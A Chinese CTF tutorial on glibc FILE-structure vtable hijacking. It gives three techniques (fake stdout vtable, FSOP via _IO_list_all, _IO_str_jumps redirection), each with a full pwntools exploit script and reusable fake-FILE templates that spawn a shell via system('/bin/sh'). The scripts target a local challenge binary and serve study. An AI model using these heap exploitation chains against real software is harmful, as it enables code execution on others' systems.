# vtable 劫持程序执行流程

## 前置知识点

vtable中是一个函数表，这个函数表中存放着我们put的一个函数指针来进行一个构造

vtable主要时要给虚拟的函数文件指针

## 攻击思路一：伪造vtable攻击

由于我们已经知道了我们构造的这个vtable工作的一个流程，因此我们可以通过申请stdout+157这个位置的文件进行一个构造并且修改了然后把我们的vtable的指针指向我们的fake_chunk

这样就可以满足我们的攻击面了

这里我们直接进行粘贴exp文件

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'

context.timeout = 1

p = process([elf.path])

def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

# # p = process([elf.path])
# add_chunk(0, 0x68)
# add_chunk(1, 0x98)
# add_chunk(2, 0x68)
# delete_chunk(1)
# add_chunk(3, 0x28)
# add_chunk(1, 0x68)
# edit_chunk(1, p16(0xc5dd))
# # gdb.attach(p)
# # pause()
# delete_chunk(2)
# delete_chunk(0)
# delete_chunk(2)
# add_chunk(2, 0x68)
# edit_chunk(2, p8(0xa0))
# add_chunk(4, 0x68)
# add_chunk(4, 0x68)
# add_chunk(4, 0x68)
# add_chunk(4, 0x68)
# # gdb.attach(p,'b *$rebase(0x13f0)\nc')
# # pause()
# edit_chunk(4, b'\x00' * 0x33 + p32(0xfbad1880) + b';sh;' + p64(0) * 3 + p8(0x88))
# p.recv()
# libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - libc.sym['_IO_2_1_stdin_']
# info("libc.address:"+hex(libc.address))
# # pause()
#
# delete_chunk(0)
# delete_chunk(1)
# delete_chunk(0)
#
# add_chunk(0,0x68)
# edit_chunk(0,p64(libc.sym['_IO_2_1_stdout_']+157))
# add_chunk(0, 0x68)
# add_chunk(0, 0x68)
# add_chunk(0, 0x68)
# gdb.attach(p,'b menu\nc')
# edit_chunk(0,p64(libc.sym['system']).ljust(0x2b, b'\x00')+p64(libc.sym['_IO_2_1_stdout_']+157+0x10-0x38))

# gdb.attach(p)
# pause()


add_chunk(0,0x68)
add_chunk(1,0x98)
add_chunk(2,0x68)
delete_chunk(1)

add_chunk(3,0x28)
add_chunk(1,0x68)
edit_chunk(1,p16(0xc5dd))

delete_chunk(2)
delete_chunk(0)
delete_chunk(2)

add_chunk(2,0x68)
edit_chunk(2,p8(0xa0))

add_chunk(4, 0x68)
add_chunk(4, 0x68)
add_chunk(4, 0x68)
add_chunk(4, 0x68)
edit_chunk(4, b'\x00' * 0x33 + p32(0xfbad1880) + b';sh;' + p64(0) * 3 + p8(0x88))

p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - libc.sym['_IO_2_1_stdin_']
info("libc.address:"+hex(libc.address))

delete_chunk(0)
delete_chunk(1)
delete_chunk(0)

add_chunk(0,0x68)
edit_chunk(0,p64(libc.sym['_IO_2_1_stdout_']+157))
add_chunk(0,0x68)
add_chunk(0,0x68)
add_chunk(0,0x68)
gdb.attach(p,'b menu\nc')
edit_chunk(0,p64(libc.sym['system']).ljust(0x2b, b'\x00')+p64(libc.sym['_IO_2_1_stdout_']+157+0x10-0x38))

# edit_chunk(0,p64(libc.sym['system']).ljust(0x2b, b'\x00')+p64(libc.sym['_IO_2_1_stdout_']+157+0x10-0x38))
# gdb.attach(p)


p.interactive()
'''
这里使用的思路是通过house of ramon来泄露一个libc，同时通过double free进行一个来申请一个stdout的空间，这里我们可以知道vtable，就是一个指向，我们可以直接指向到我们伪造的system函数的位置进行一个权限的获取
'''
```

## 攻击手法二：fsop

这个攻击模式是一个vtable的一个特殊情况，这个特殊情况使用的方法并不是获取stdou的权限，核心主要是使用list_all进行一个攻击的。

FSOP（ File Stream Oriented Programming ） 的核心思想就是劫持 _IO_list_all 指向伪造的_IO_FILE_plus 。之后使程序执行 _IO_flush_all_lockp 函数。该函数会刷新 _IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush ，也对应着会调用 _IO_FILE_plus.vtable 中的_IO_overflow 。

劫持 _IO_list_all 的方式有两种：

修改 IO_FILE 结构体，为了不影响 IO 建议修改 _IO_2_1_stderr 结构体。

利用例如 

large bin attack 的攻击方法将 _IO_list_all 覆盖成一个 chunk 地址，然后在该chunk 上伪造 IO_FILE 结构体。

在劫持 _IO_2_1_stderr 时除了修改 vtable 指针指向伪造 vtable 外，要想调用 _IO_overflow ，还需要修改 _IO_2_1_stderr 以满足以下条件：

fp-\>_mode <= 0

fp->_IO_write_ptr > fp-\>_IO_write_base

因此不妨将 vtable 伪造在 _IO_2_1_stderr + 0x10 处使 _IO_2_1_stderr 的 fp->_IO_write_ptr恰好对应于 vtable 的 _IO_overflow 。然后将 fp->_IO_write_ptr 写入 system 函数地址。由于_IO_overflow 传入的参数为 _IO_2_1_stderr 结构体，因此将结构体其实位置处写入 /bin/sh 字符串

io链：

```tex
exit -> __run_exit_handlers -> _IO_cleanup -> _IO_flush_all_lockp -> fileop.vtable.overflow
```

```py
fake_file = b""
fake_file += b"/bin/sh\x00" # _flags, an magic number
fake_file += p64(0) # _IO_read_ptr
fake_file += p64(0) # _IO_read_end
fake_file += p64(0) # _IO_read_base
fake_file += p64(0) # _IO_write_base
fake_file += p64(libc.sym['system']) # _IO_write_ptr
fake_file += p64(0) # _IO_write_end
fake_file += p64(0) # _IO_buf_base;
fake_file += p64(0) # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_file += p64(0) * 4 # from _IO_save_base to _markers
fake_file += p64(libc.sym['_IO_2_1_stdout_']) # the FILE chain ptr
fake_file += p32(2) # _fileno for stderr is 2
fake_file += p32(0) # _flags2, usually 0
fake_file += p64(0xFFFFFFFFFFFFFFFF) # _old_offset, -1
fake_file += p16(0) # _cur_column
fake_file += b"\x00" # _vtable_offset
fake_file += b"\n" # _shortbuf[1]
fake_file += p32(0) # padding
fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0) # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF) # _offset, -1
fake_file += p64(0) # _codecvt, usually 0
fake_file += p64(libc.sym['_IO_2_1_stdout_'] - 0x160) # _IO_wide_data_1
fake_file += p64(0) * 3 # from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF) # _mode, usually -1
fake_file += b"\x00" * 19 # _unused2
fake_file = fake_file.ljust(0xD8, b'\x00') # adjust to vtable
fake_file += p64(libc.sym['_IO_2_1_stderr_'] + 0x10) # fake vtable
```

exp:

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0, 0x418)
add_chunk(1, 0x18)
add_chunk(2, 0x428)
add_chunk(3, 0x18)

delete_chunk(2)
delete_chunk(0)

show_chunk(0)
p.recv()
heap_base = u64(p.recv(6).ljust(8,b'\x00')) & ~0xfff
info('heap_base:'+hex(heap_base))
show_chunk(2)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8,b'\x00'))-0x39bb78
info('libc.address:'+hex(libc.address))

add_chunk(0,0x418)
edit_chunk(2,p64(0)*3+p64(libc.sym['_IO_list_all']-0x20))

delete_chunk(0)
add_chunk(10,10)
# gdb.attach(p)
# pause()

#
edit_chunk(2,p64(libc.address+0x39bf68)*2+p64(heap_base+0x440)*2)
# gdb.attach(p)
# pause()
add_chunk(0,0x428)

#
# gdb.attach(p)
#
edit_chunk(1, 'a' * 0x10 + '/bin/sh\x00')
#
fake_file = b''
fake_file += p64(0)  # _IO_read_end
fake_file += p64(0)  # _IO_read_base
fake_file += p64(0)  # _IO_write_base
fake_file += p64(libc.sym['system'])  # _IO_write_ptr
fake_file += p64(0)  # _IO_write_end
fake_file += p64(0)  # _IO_buf_base;
fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_file += p64(0) * 4  # from _IO_save_base to _markers
fake_file += p64(0)  # the FILE chain ptr
fake_file += p32(2)  # _fileno for stderr is 2
fake_file += p32(0)  # _flags2, usually 0
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_file += p16(0)  # _cur_column
fake_file += b"\x00"  # _vtable_offset
fake_file += b"\x00"  # _shortbuf[1]
fake_file += p32(0)  # padding
fake_file += p64(0)  # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_file += p64(0)  # _codecvt, usually 0
fake_file += p64(0)  # _IO_wide_data_1
fake_file += p64(0) * 3  # from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
fake_file += b"\x00" * 19  # _unused2
fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
fake_file += p64(heap_base+0x440 + 0x10)  # fake vtable
#
# gdb.attach(p)
edit_chunk(2,fake_file)
gdb.attach(p,"b exit")
pause()
p.sendafter("choice:", "5")

p.interactive()
```

## 攻击手法三：IO_FILE 之 劫持vtable到_IO_str_jumps

vtable也是我们在2.30一下的一个手法从2.24开始的，应为在2.24的时候编译器上加入了一个对vtable的一个检查，这个检查主要是对vtable的一个范围进行了一个规定，确保`vtable`指针在`__stop___libc_IO_vtables - __start___libc_IO_vtables`之间。

```c
static inline const struct _IO_jump_t *
IO_validate_vtable(const struct _IO_jump_t *vtable)
{
   /* Fast path: The vtable pointer is within the __libc_IO_vtables
      section.  */
   uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
   uintptr_t ptr = (uintptr_t)vtable;
   uintptr_t offset = ptr - (uintptr_t)__start___libc_IO_vtables;
   if (__glibc_unlikely(offset >= section_length))
      /* The vtable pointer is not in the expected section.  Use the
         slow path, which will terminate the process if necessary.  */
      _IO_vtable_check();
   return vtable;
}

```

主要的判断代码在这里了，这里我们可以知道主要的判断点就是在stop和start之间因此我们要找一个我们需要的一个地方来获取一个vtable的劫持，这里可以在这个范围中非常容易的找到这个_io_str_jumps这个函数指针以及他下面的_IO_wstr_jumps

```c
extern const struct _IO_jump_t _IO_str_jumps attribute_hidden;
extern const struct _IO_jump_t _IO_wstr_jumps attribute_hidden;
```

这里我们可以知道我们确实找到了对应的两个指针

```c
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

在这里我们同样也看到了他对应的一个结构体，其实这个结构体和io-jump-t这个结构体非常的类似因此我们可以尝试来修改这个这个结构体从而来劫持这个vtable，知道这个以后我们的利用手法就非常的明确了

1.largebin attack将IO_FILE劫持到堆上，即fake_file。

2.fake_file的相关成员设置好，满足触发链上的各种条件，包括设置fp->_IO_buf_base="/bin/sh\x00"

_3.在IO_FILE类型的fake_file之后附加system函数指针，为下一阶段调用_s.__free_buffer类型混淆作准备__

4.fake_file的vtable指向_IO_str_jumps偏移offset的位置，使得下一个函数触发到_IO_default_finish

5.__触发_s.__free_buffer(fp->_IO_buf_base)，实际上触发system("/bin/sh\x00")

那么接下来我们就对这个手法进行一个尝试

因此通过这个largebin attack的手法来进行一个攻击接下来我带上他的脚本的板子

```py
from bisect import bisect_left

from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0, 0x418)
add_chunk(1, 0x18)
add_chunk(2, 0x428)
add_chunk(3, 0x18)

delete_chunk(2)
show_chunk(2)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x3afca0
info("libc base: " + hex(libc.address))

add_chunk(10, 0x500)

# find _IO_str_jumps
IO_file_jumps = libc.symbols['_IO_file_jumps']
IO_str_underflow = libc.symbols['_IO_str_underflow'] - libc.address
IO_str_underflow_ptr = list(libc.search(p64(IO_str_underflow)))
IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + 0x20)] - 0x20
success("_IO_str_jumps: "+hex(IO_str_jumps))
# construct the fake file structure
fake_file = b""
fake_file += p64(0)  # _IO_read_end
fake_file += p64(0)  # _IO_read_base
fake_file += p64(0)  # _IO_write_base
fake_file += p64(libc.sym['stdout'] - 0x20)  # _IO_write_ptr
fake_file += p64(0)  # _IO_write_end
fake_file += p64(libc.search("/bin/sh").__next__())  # _IO_buf_base;
fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_file += p64(0) * 4  # from _IO_save_base to _markers
fake_file += p64(0)  # the FILE chain ptr
fake_file += p32(2)  # _fileno for stderr is 2
fake_file += p32(0)  # _flags2, usually 0
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_file += p16(0)  # _cur_column
fake_file += b"\x00"  # _vtable_offset
fake_file += b"\n"  # _shortbuf[1]
fake_file += p32(0)  # padding
fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_file += p64(0)  # _codecvt, usually 0
fake_file += p64(0)  # _IO_wide_data_1
fake_file += p64(0) * 3  # from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
fake_file += b"\x00" * 19  # _unused2
fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
fake_file += p64(IO_str_jumps - 0x28) + p64(0) + p64(libc.sym['system'])  # fake vtable
edit_chunk(2, fake_file)
print(len(fake_file))
delete_chunk(0)
# edit_chunk(2,fake_file)

gdb.attach(p)
add_chunk(10,0x20)
p.interactive()
```

板子：

```py
IO_file_jumps = libc.symbols['_IO_file_jumps']
IO_str_underflow = libc.symbols['_IO_str_underflow'] - libc.address
IO_str_underflow_ptr = list(libc.search(p64(IO_str_underflow)))
IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + 0x20)] - 0x20 #这一段的原因就是我们在写有一些题目的时候我们发现我们的字符表不一定会出现，因此我们使用这个方法在一个有字符表的libc上进行一个测试，然后更改测试偏移进行一个计算就可以了
success("_IO_str_jumps: "+hex(IO_str_jumps))
# construct the fake file structure
fake_file = b""
fake_file += p64(0)  # _IO_read_end
fake_file += p64(0)  # _IO_read_base
fake_file += p64(0)  # _IO_write_base
fake_file += p64(libc.sym['stdout'] - 0x20)  # _IO_write_ptr
fake_file += p64(0)  # _IO_write_end
fake_file += p64(libc.search("/bin/sh").__next__())  # _IO_buf_base;
fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_file += p64(0) * 4  # from _IO_save_base to _markers
fake_file += p64(0)  # the FILE chain ptr
fake_file += p32(2)  # _fileno for stderr is 2
fake_file += p32(0)  # _flags2, usually 0
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_file += p16(0)  # _cur_column
fake_file += b"\x00"  # _vtable_offset
fake_file += b"\n"  # _shortbuf[1]
fake_file += p32(0)  # padding
fake_file += p64(libc.sym['_IO_2_1_stdout_'] + 0x1ea0)  # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_file += p64(0)  # _codecvt, usually 0
fake_file += p64(0)  # _IO_wide_data_1
fake_file += p64(0) * 3  # from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
fake_file += b"\x00" * 19  # _unused2
fake_file = fake_file.ljust(0xD8 - 0x10, b'\x00')  # adjust to vtable
fake_file += p64(IO_str_jumps - 0x28) + p64(0) + p64(libc.sym['system'])  # fake vtable
edit_chunk(2, fake_file)
print(len(fake_file))
delete_chunk(0)
```

